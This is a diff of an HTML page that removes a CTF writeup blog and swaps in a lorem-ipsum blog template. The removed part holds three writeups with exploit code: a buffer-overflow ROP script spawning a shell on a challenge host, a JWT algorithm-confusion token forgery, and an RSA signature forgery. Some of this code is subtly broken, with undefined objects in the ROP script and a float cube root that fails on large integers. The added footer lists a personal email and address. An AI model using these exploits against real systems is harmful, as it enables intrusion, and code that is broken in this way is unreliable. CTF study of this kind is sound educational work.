@@ -5,7 +5,7 @@
     <meta charset="UTF-8">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Security Researcher | CTF Writeups</title>
+    <title>Cool Blogger</title>
     <!-- Box-icon -->
     <link href='https://unpkg.com/boxicons@2.1.4/css/boxicons.min.css' rel='stylesheet'>
     <link rel="stylesheet" href="style.css">
@@ -14,338 +14,223 @@
 <body>
     <header>
         <div class="nav container">
-            <a href="#" class="logo">Security <span>Researcher</span></a>
-            <a href="#contact" class="login">Contact</a>
+            <a href="#" class="logo">Code <span>MyBro</span></a>
+            <a href="#" class="login">Sign Up</a>
         </div>
     </header>
 
     <section class="home" id="home">
         <div class="home-text container">
-            <h2 class="home-title">CTF Writeups & Security Blog</h2>
-            <span class="home-subtitle">Capture The Flag solutions and security research</span>
+            <h2 class="home-title">Cool Blogger</h2>
+            <span class="home-subtitle">Your source of great content</span>
         </div>
     </section>
 
     <section class="about container" id="about">
         <div class="contentBx">
-            <h2 class="titleText">About <span>Me</span></h2>
+            <h2 class="titleText">Catch up with the <span>trending topics</span> </h2>
             <p class="title-text">
-                Hello! I'm a cybersecurity enthusiast and CTF player passionate about ethical hacking, reverse engineering, and vulnerability research. 
-                <br><br>
-                I participate in various CTF competitions to sharpen my skills and learn new techniques. This website documents my journey through writeups of challenges I've solved.
-                <br><br>
-                My expertise includes:
+                Lorem ipsum dolor sit amet consectetur adipisicing elit. Laborum eos consequuntur voluptate dolorum
+                totam provident ducimus cupiditate dolore doloribus repellat. Saepe ad fugit similique quis quam. Odio
+                suscipit incidunt distinctio.
+                <br>Lorem ipsum dolor sit amet consectetur adipisicing elit. Sed blanditiis libero pariatur ipsum
+                suscipit voluptates aut, repellendus quos dolor autem, natus laboriosam consectetur maxime cumque, sunt
+                magni optio? Veritatis, ea?
             </p>
-            <ul class="title-text">
-                <li>Binary Exploitation</li>
-                <li>Web Application Security</li>
-                <li>Cryptography</li>
-                <li>Forensics</li>
-                <li>Reverse Engineering</li>
-            </ul>
-            <a href="#posts" class="btn2">View Writeups</a>
+            <a href="#" class="btn2">Read more</a>
         </div>
         <div class="imgBx">
-            <img src="https://images.unsplash.com/photo-1550751827-4bd374c3f58b?ixlib=rb-4.0.3&ixid=M3wxMjA3fDB8MHxwaG90by1wYWdlfHx8fGVufDB8fHx8fA%3D%3D&auto=format&fit=crop&w=1470&q=80" alt="Profile picture" class="fitBg">
+            <img src="images/about.png" alt="" class="fitBg">
         </div>
     </section>
 
     <div class="post-filter container">
         <span class="filter-item active-filter" data-filter="all">All</span>
-        <span class="filter-item" data-filter="pwn">Pwn</span>
-        <span class="filter-item" data-filter="web">Web</span>
-        <span class="filter-item" data-filter="crypto">Crypto</span>
-        <span class="filter-item" data-filter="reversing">Reversing</span>
-        <span class="filter-item" data-filter="forensics">Forensics</span>
+        <span class="filter-item" data-filter="tech">Tech</span>
+        <span class="filter-item" data-filter="food">Food</span>
+        <span class="filter-item" data-filter="news">News</span>
     </div>
 
-    <div class="post container" id="posts">
-        <!-- CTF Writeup 1 -->
-        <div class="post-box pwn">
-            <img src="https://images.unsplash.com/photo-1563986768609-322da13575f3?ixlib=rb-4.0.3&ixid=M3wxMjA3fDB8MHxwaG90by1wYWdlfHx8fGVufDB8fHx8fA%3D%3D&auto=format&fit=crop&w=1470&q=80" alt="Binary Exploitation" class="post-img">
-            <h2 class="category">Pwn</h2>
-            <a href="#writeup1" class="post-title writeup-toggle">Buffer Overflow in Simple Service</a>
-            <span class="post-date">12 June 2024</span>
-            <div class="tags">
-                <span class="tag">x86</span>
-                <span class="tag">ROP</span>
-                <span class="tag">ASLR bypass</span>
-                <span class="ctf-difficulty-medium">Medium</span>
-            </div>
-            <p class="post-description">Exploiting a simple buffer overflow vulnerability in a network service to gain remote code execution. This writeup covers ROP chain construction and ASLR bypass techniques.</p>
+    <div class="post container">
+        <!-- Post 1 -->
+        <div class="post-box tech">
+            <img src="images/img1.jpg" alt="" class="post-img">
+            <h2 class="category">Tech</h2>
+            <a href="#" class="post-title">How to create the best UI with Figma</a>
+            <span class="post-date">23 march 2025</span>
+            <p class="post-description">Lorem ipsum dolor sit, amet consectetur adipisicing elit. Consectetur,
+                similique, rerum excepturi harum, vitae facilis corrupti vel modi debitis est perferendis aut quasi ea
+                unde repudiandae iste architecto. Corporis, voluptates.</p>
             <div class="profile">
-                <img src="https://images.unsplash.com/photo-1535713875002-d1d0cf377fde?ixlib=rb-4.0.3&ixid=M3wxMjA3fDB8MHxwaG90by1wYWdlfHx8fGVufDB8fHx8fA%3D%3D&auto=format&fit=crop&w=880&q=80" alt="Profile" class="profile-img">
-                <span class="profile-name">SecurityResearcher</span>
-            </div>
-            
-            <!-- Writeup content (hidden by default) -->
-            <div id="writeup1" class="writeup-content">
-                <h3>Buffer Overflow in Simple Service - Detailed Writeup</h3>
-                <h4>Challenge Description</h4>
-                <p>We're given a 32-bit ELF binary running on a remote server that implements a simple network service. The service reads user input into a fixed-size buffer without proper bounds checking.</p>
-                
-                <h4>Initial Analysis</h4>
-                <pre>
-$ file vuln_service
-vuln_service: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, 
-interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=..., not stripped
-
-$ checksec --file=vuln_service
-[*] '/home/user/vuln_service'
-    Arch:     i386-32-little
-    RELRO:    Partial RELRO
-    Stack:    No canary found
-    NX:       NX enabled
-                </pre>
-                
-                <h4>Vulnerability Discovery</h4>
-                <p>Using Ghidra, we decompile the main function:</p>
-                <pre>
-void handle_connection(int sockfd) {
-    char buffer[128];
-    recv(sockfd, buffer, 1024, 0); // Buffer overflow here
-    // ...
-}
-                </pre>
-                
-                <h4>Exploit Development</h4>
-                <p>We need to:</p>
-                <ol>
-                    <li>Find the offset to EIP (140 bytes)</li>
-                    <li>Leak libc address to bypass ASLR</li>
-                    <li>Build ROP chain for system("/bin/sh")</li>
-                </ol>
-                
-                <h4>Final Exploit</h4>
-                <pre>
-from pwn import *
-
-context(arch='i386', os='linux')
-
-# Connect to target
-p = remote('ctf.example.com', 4444)
-
-# Stage 1: Leak libc address
-payload = b'A'*140
-payload += p32(elf.plt['puts'])
-payload += p32(elf.sym['main'])
-payload += p32(elf.got['puts'])
-p.send(payload)
-
-# Parse leaked address
-leak = u32(p.recv(4))
-libc.address = leak - libc.sym['puts']
-
-# Stage 2: ROP to system
-payload = b'A'*140
-payload += p32(libc.sym['system'])
-payload += b'BBBB'  # fake ret
-payload += p32(next(libc.search(b'/bin/sh')))
-p.send(payload)
-
-p.interactive()
-                </pre>
-                
-                <h4>Flag</h4>
-                <p>CTF{Buffer_0verfl0ws_st1ll_r0ck_in_2024}</p>
+                <img src="images/about.png" alt="" class="profile-img">
+                <span class="profile-name">AKM</span>
             </div>
         </div>
-        
-        <!-- CTF Writeup 2 -->
-        <div class="post-box web">
-            <img src="https://images.unsplash.com/photo-1551288049-bebda4e38f71?ixlib=rb-4.0.3&ixid=M3wxMjA3fDB8MHxwaG90by1wYWdlfHx8fGVufDB8fHx8fA%3D%3D&auto=format&fit=crop&w=1470&q=80" alt="Web Security" class="post-img">
-            <h2 class="category">Web</h2>
-            <a href="#writeup2" class="post-title writeup-toggle">JWT Authentication Bypass</a>
-            <span class="post-date">5 May 2024</span>
-            <div class="tags">
-                <span class="tag">JWT</span>
-                <span class="tag">Algorithm Confusion</span>
-                <span class="tag">Web</span>
-                <span class="ctf-difficulty-easy">Easy</span>
-            </div>
-            <p class="post-description">Bypassing JWT authentication by exploiting algorithm confusion to gain admin privileges on a vulnerable web application.</p>
+        <!-- Post 2 -->
+        <div class="post-box food">
+            <img src="images/img2.jpg" alt="" class="post-img">
+            <h2 class="category">Tech</h2>
+            <a href="#" class="post-title">How to create the best UI with Figma</a>
+            <span class="post-date">12 Feb 2022</span>
+            <p class="post-description">Lorem ipsum dolor sit, amet consectetur adipisicing elit. Consectetur,
+                similique, rerum excepturi harum, vitae facilis corrupti vel modi debitis est perferendis aut quasi ea
+                unde repudiandae iste architecto. Corporis, voluptates.</p>
             <div class="profile">
-                <img src="https://images.unsplash.com/photo-1535713875002-d1d0cf377fde?ixlib=rb-4.0.3&ixid=M3wxMjA3fDB8MHxwaG90by1wYWdlfHx8fGVufDB8fHx8fA%3D%3D&auto=format&fit=crop&w=880&q=80" alt="Profile" class="profile-img">
-                <span class="profile-name">SecurityResearcher</span>
-            </div>
-            
-            <div id="writeup2" class="writeup-content">
-                <h3>JWT Authentication Bypass - Detailed Writeup</h3>
-                <h4>Challenge Description</h4>
-                <p>The web application uses JWT for authentication. Our goal is to modify our privileges to gain admin access.</p>
-                
-                <h4>Initial Analysis</h4>
-                <p>Inspecting the JWT token in the browser:</p>
-                <pre>
-eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6InVzZXIiLCJyb2xlIjoidXNlciIsImlhdCI6MTY4MzQ1NjAwMH0.8Qh5l5sP-sG2o-3mYpN3w7v6Z1XKj7V0L2yB6nW3d4E
-                </pre>
-                
-                <h4>Vulnerability Discovery</h4>
-                <p>The server is vulnerable to algorithm confusion (switching from RS256 to HS256).</p>
-                
-                <h4>Exploit Steps</h4>
-                <ol>
-                    <li>Get the public key from /static/public.key</li>
-                    <li>Change the algorithm to HS256</li>
-                    <li>Sign the token with the public key</li>
-                    <li>Modify the role to "admin"</li>
-                </ol>
-                
-                <h4>Final Exploit</h4>
-                <pre>
-import jwt
-
-# Get public key from server
-public_key = open('public.key', 'r').read()
-
-# Create malicious token
-malicious_token = jwt.encode(
-    {
-        "username": "user",
-        "role": "admin",
-        "iat": 1683456000
-    },
-    public_key,
-    algorithm="HS256"
-)
-
-print(malicious_token)
-                </pre>
-                
-                <h4>Flag</h4>
-                <p>CTF{jWT_4lg0r1thm_c0nfu510n_1s_b4d}</p>
+                <img src="images/about.png" alt="my_profile" class="profile-img">
+                <span class="profile-name">AKM</span>
             </div>
         </div>
-        
-        <!-- CTF Writeup 3 -->
-        <div class="post-box crypto">
-            <img src="https://images.unsplash.com/photo-1635070041078-e363dbe005cb?ixlib=rb-4.0.3&ixid=M3wxMjA3fDB8MHxwaG90by1wYWdlfHx8fGVufDB8fHx8fA%3D%3D&auto=format&fit=crop&w=1470&q=80" alt="Cryptography" class="post-img">
-            <h2 class="category">Crypto</h2>
-            <a href="#writeup3" class="post-title writeup-toggle">RSA Signature Forgery</a>
-            <span class="post-date">22 April 2024</span>
-            <div class="tags">
-                <span class="tag">RSA</span>
-                <span class="tag">Signature Forgery</span>
-                <span class="tag">Cryptography</span>
-                <span class="ctf-difficulty-hard">Hard</span>
-            </div>
-            <p class="post-description">Forging RSA signatures by exploiting improper padding verification to gain unauthorized access to a secure system.</p>
+        <!-- Post 3 -->
+        <div class="post-box food">
+            <img src="images/img3.jpg" alt="" class="post-img">
+            <h2 class="category">Food</h2>
+            <a href="#" class="post-title">How to create the best UI with Figma</a>
+            <span class="post-date">12 Feb 2022</span>
+            <p class="post-description">Lorem ipsum dolor sit, amet consectetur adipisicing elit. Consectetur,
+                similique, rerum excepturi harum, vitae facilis corrupti vel modi debitis est perferendis aut quasi ea
+                unde repudiandae iste architecto. Corporis, voluptates.</p>
             <div class="profile">
-                <img src="https://images.unsplash.com/photo-1535713875002-d1d0cf377fde?ixlib=rb-4.0.3&ixid=M3wxMjA3fDB8MHxwaG90by1wYWdlfHx8fGVufDB8fHx8fA%3D%3D&auto=format&fit=crop&w=880&q=80" alt="Profile" class="profile-img">
-                <span class="profile-name">SecurityResearcher</span>
+                <img src="images/about.png" alt="" class="profile-img">
+                <span class="profile-name">AKM</span>
             </div>
-            
-            <div id="writeup3" class="writeup-content">
-                <h3>RSA Signature Forgery - Detailed Writeup</h3>
-                <h4>Challenge Description</h4>
-                <p>The server implements an RSA signature verification system with improper padding checks, allowing signature forgery.</p>
-                
-                <h4>Initial Analysis</h4>
-                <p>The server uses PKCS#1 v1.5 padding but doesn't properly verify the padding structure.</p>
-                
-                <h4>Vulnerability Discovery</h4>
-                <p>By crafting a signature that contains the ASN.1 hash identifier but with incorrect padding, we can bypass verification.</p>
-                
-                <h4>Exploit Development</h4>
-                <p>We use the Bleichenbacher's attack to create a signature that will be accepted by the flawed verifier.</p>
-                
-                <h4>Final Exploit</h4>
-                <pre>
-from Crypto.Util.number import bytes_to_long, long_to_bytes
-import hashlib
-
-def forge_signature(message):
-    # ASN.1 SHA256 prefix
-    asn1_sha256 = b'\x30\x31\x30\x0d\x06\x09\x60\x86\x48\x01\x65\x03\x04\x02\x01\x05\x00\x04\x20'
-    
-    # Hash the message
-    m_hash = hashlib.sha256(message).digest()
-    
-    # Construct forged padding
-    # The server doesn't check the padding bytes between the prefix and the hash
-    forged_padding = b'\x00\x01' + b'\xff' * 200 + b'\x00' + asn1_sha256 + m_hash
-    
-    # Convert to integer
-    forged_sig = bytes_to_long(forged_padding)
-    
-    # Take cube root to get signature
-    forged_sig = int(forged_sig ** (1/3)) + 1
-    
-    return long_to_bytes(forged_sig)
-
-# Usage
-message = b"admin=True"
-fake_sig = forge_signature(message)
-print(fake_sig.hex())
-                </pre>
-                
-                <h4>Flag</h4>
-                <p>CTF{ble1ch3nb4ch3r_4tt4ck_ftw}</p>
+        </div>
+        <!-- Post 4 -->
+        <div class="post-box news">
+            <img src="images/img4.jpg" alt="" class="post-img">
+            <h2 class="category">Tech</h2>
+            <a href="#" class="post-title">How to create the best UI with Figma</a>
+            <span class="post-date">12 Feb 2022</span>
+            <p class="post-description">Lorem ipsum dolor sit, amet consectetur adipisicing elit. Consectetur,
+                similique, rerum excepturi harum, vitae facilis corrupti vel modi debitis est perferendis aut quasi ea
+                unde repudiandae iste architecto. Corporis, voluptates.</p>
+            <div class="profile">
+                <img src="images/about.png" alt="" class="profile-img">
+                <span class="profile-name">AKM</span>
+            </div>
+        </div>
+        <!-- Post 5 -->
+        <div class="post-box tech">
+            <img src="images/img5.jpg" alt="" class="post-img">
+            <h2 class="category">Tech</h2>
+            <a href="#" class="post-title">How to create the best UI with Figma</a>
+            <span class="post-date">12 Feb 2022</span>
+            <p class="post-description">Lorem ipsum dolor sit, amet consectetur adipisicing elit. Consectetur,
+                similique, rerum excepturi harum, vitae facilis corrupti vel modi debitis est perferendis aut quasi ea
+                unde repudiandae iste architecto. Corporis, voluptates.</p>
+            <div class="profile">
+                <img src="images/about.png" alt="" class="profile-img">
+                <span class="profile-name">AKM</span>
+            </div>
+        </div>
+        <!-- Post 6 -->
+        <div class="post-box news">
+            <img src="images/img4.jpg" alt="" class="post-img">
+            <h2 class="category">News</h2>
+            <a href="#" class="post-title">How to create the best UI with Figma</a>
+            <span class="post-date">12 Feb 2022</span>
+            <p class="post-description">Lorem ipsum dolor sit, amet consectetur adipisicing elit. Consectetur,
+                similique, rerum excepturi harum, vitae facilis corrupti vel modi debitis est perferendis aut quasi ea
+                unde repudiandae iste architecto. Corporis, voluptates.</p>
+            <div class="profile">
+                <img src="images/about.png" alt="" class="profile-img">
+                <span class="profile-name">AKM</span>
+            </div>
+        </div>
+        <!-- Post 7 -->
+        <div class="post-box tech">
+            <img src="images/img7.jpg" alt="" class="post-img">
+            <h2 class="category">Tech</h2>
+            <a href="#" class="post-title">How to create the best UI with Figma</a>
+            <span class="post-date">12 Feb 2022</span>
+            <p class="post-description">Lorem ipsum dolor sit, amet consectetur adipisicing elit. Consectetur,
+                similique, rerum excepturi harum, vitae facilis corrupti vel modi debitis est perferendis aut quasi ea
+                unde repudiandae iste architecto. Corporis, voluptates.</p>
+            <div class="profile">
+                <img src="images/about.png" alt="" class="profile-img">
+                <span class="profile-name">AKM</span>
+            </div>
+        </div>
+        <!-- Post 1 -->
+        <div class="post-box news">
+            <img src="images/img8.jpg" alt="" class="post-img">
+            <h2 class="category">News</h2>
+            <a href="#" class="post-title">How to create the best UI with Figma</a>
+            <span class="post-date">12 Feb 2022</span>
+            <p class="post-description">Lorem ipsum dolor sit, amet consectetur adipisicing elit. Consectetur,
+                similique, rerum excepturi harum, vitae facilis corrupti vel modi debitis est perferendis aut quasi ea
+                unde repudiandae iste architecto. Corporis, voluptates.</p>
+            <div class="profile">
+                <img src="images/about.png" alt="" class="profile-img">
+                <span class="profile-name">AKM</span>
+            </div>
+        </div>
+        <!-- Post 9 -->
+        <div class="post-box food">
+            <img src="images/img10.jpg" alt="" class="post-img">
+            <h2 class="category">Food</h2>
+            <a href="#" class="post-title">How to create the best UI with Figma</a>
+            <span class="post-date">12 Feb 2022</span>
+            <p class="post-description">Lorem ipsum dolor sit, amet consectetur adipisicing elit. Consectetur,
+                similique, rerum excepturi harum, vitae facilis corrupti vel modi debitis est perferendis aut quasi ea
+                unde repudiandae iste architecto. Corporis, voluptates.</p>
+            <div class="profile">
+                <img src="images/about.png" alt="" class="profile-img">
+                <span class="profile-name">AKM</span>
             </div>
         </div>
     </div>
 
-    <footer id="contact">
+    <footer>
         <div class="footer-container">
             <div class="sec aboutus">
-                <h2>About This Site</h2>
-                <p>This website documents my journey in cybersecurity through CTF competitions and security research. All writeups are my own solutions to challenges I've solved in various competitions.</p>
+                <h2>About Us</h2>
+                <p>Lorem ipsum dolor, sit amet consectetur adipisicing elit. Ducimus quisquam minus quo illo numquam vel
+                    incidunt pariatur hic commodi expedita tempora praesentium at iure fugiat ea, quam laborum aperiam
+                    veritatis.</p>
                 <ul class="sci">
-                    <li><a href="#"><i class="bx bxl-github"></i></a></li>
+                    <li><a href="#"><i class="bx bxl-facebook"></i></a></li>
+                    <li><a href="#"><i class="bx bxl-instagram"></i></a></li>
                     <li><a href="#"><i class="bx bxl-twitter"></i></a></li>
                     <li><a href="#"><i class="bx bxl-linkedin"></i></a></li>
-                    <li><a href="#"><i class="bx bxl-discord-alt"></i></a></li>
                 </ul>
             </div>
             <div class="sec quicklinks">
                 <h2>Quick Links</h2>
                 <ul>
-                    <li><a href="#home">Home</a></li>
-                    <li><a href="#about">About</a></li>
-                    <li><a href="#posts">Writeups</a></li>
+                    <li><a href="#">Home</a></li>
+                    <li><a href="#">About</a></li>
                 </ul>
             </div>
             <div class="sec contactBx">
                 <h2>Contact Info</h2>
                 <ul class="info">
                     <li>
-                        <span><i class='bx bxs-envelope'></i></span>
-                        <p><a href="mailto:security@researcher.com">security@researcher.com</a></p>
+                        <span><i class='bx bxs-map'></i></span>
+                        <span>Thata, Ugrasenpur <br>Handia, prayagraj 212405<br>India</span>
                     </li>
                     <li>
-                        <span><i class='bx bxl-github'></i></span>
-                        <p><a href="https://github.com/securityresearcher" target="_blank">github.com/securityresearcher</a></p>
-                    </li>
-                    <li>
-                        <span><i class='bx bxs-shield-alt'></i></span>
-                        <p><a href="https://ctftime.org/team/12345" target="_blank">CTFtime Profile</a></p>
+                        <span><i class='bx bx-envelope'></i></span>
+                        <p><a href="https://mail.google.com/mail/?view=cm&fs=1&to=amitkumarmaurya10122005@gmail.com"
+                                target="_blank" style="text-decoration: none;">
+                                <button
+                                    style="background-color: aqua; color: rgb(38, 39, 56); padding: 10px 20px; border: none; border-radius: 5px; cursor: pointer;">Contact
+                                    Me</button>
+                            </a>
+
                     </li>
                 </ul>
             </div>
         </div>
     </footer>
 
+      
     <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.1/jquery.min.js"
     integrity="sha512-aVKKRRi/Q/YV+4mjoKBsE4x3H+BkegoM/em46NNlCqNTmUYADjBbeNefNxYV7giUp0VxICtqdrbqU7iVaeZNXA=="
     crossorigin="anonymous" referrerpolicy="no-referrer"></script>
-    <script src="https://unpkg.com/scrollreveal"></script>
+    <!-- scroll reveal  -->
+    <script src="https://unpkg.com/scrollreveal"></script>  
     <script src="script.js"></script>
-    <script>
-        // Toggle writeup content visibility
-        document.querySelectorAll('.writeup-toggle').forEach(link => {
-            link.addEventListener('click', function(e) {
-                e.preventDefault();
-                const writeupId = this.getAttribute('href');
-                const writeupContent = document.querySelector(writeupId);
-                
-                // Toggle the 'active' class
-                writeupContent.classList.toggle('active');
-                
-                // Scroll to the writeup content
-                writeupContent.scrollIntoView({ behavior: 'smooth' });
-            });
-        });
-    </script>
+   
 </body>
 
 </html>
